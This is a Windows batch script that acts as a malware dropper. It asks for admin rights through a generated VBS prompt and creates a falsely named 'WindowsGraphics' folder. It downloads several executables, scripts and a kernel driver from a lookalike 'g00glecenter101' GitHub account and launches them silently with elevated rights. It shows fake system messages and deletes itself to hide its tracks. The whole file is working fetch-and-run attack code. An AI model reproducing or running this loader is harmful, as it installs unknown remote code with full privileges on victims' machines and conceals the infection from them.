@echo off
setlocal

:: ============================================================
:: 1. UAC ELEVATION (The "One-Time" Admin Ask)
:: ============================================================
:: This ensures everything (Sigurd, Whitelisting, Drivers) works silently.
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [SYSTEM] Requesting administrative privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\admin.vbs"
    wscript "%temp%\admin.vbs"
    exit /b
)
if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"

:: ============================================================
:: 2. DIRECTORY SETUP
:: ============================================================
set "workDir=%AppData%\Local\WindowsGraphics\"
if not exist "%workDir%" mkdir "%workDir%"
cd /d "%workDir%"

:: Create the driver folder specifically for k7RKScan
if not exist "driver" mkdir "driver"

echo [SYSTEM] Syncing components...

:: ============================================================
:: 3. DOWNLOADS (Paste your RAW GitHub links below)
:: ============================================================

:: 1. launcher.vbs
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs', 'launcher.vbs')"

:: 2. boom.bat
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat', 'boom.bat')"

:: 3. sigurd.exe
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe', 'sigurd.exe')"

:: 5. config.toml (or config.toml)
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml', 'config.toml')"

:: FILE 6: The Ghost Launcher (Saved as launcher.vbs)
echo [SYSTEM] Finalizing Ghost module...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/ghost_launcher.vbs', 'launcher.vbs')"

:: 7. THE DRIVER (k7RKScan.sys) - Put inside the driver folder
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys', 'driver\k7RKScan.sys')"

:: ============================================================
:: 4. THE SILENT HANDOFF
:: ============================================================
echo [FINISHING] Initializing system...

:: Launch the VBS silently. Because this script is Admin, VBS will be too.
if exist "launcher.vbs" (
    start "" "wscript.exe" "launcher.vbs"
)

:: Clean up the installer so it disappears
echo [SUCCESS] Configuration complete.
(goto) 2>nul & del "%~f0"
exit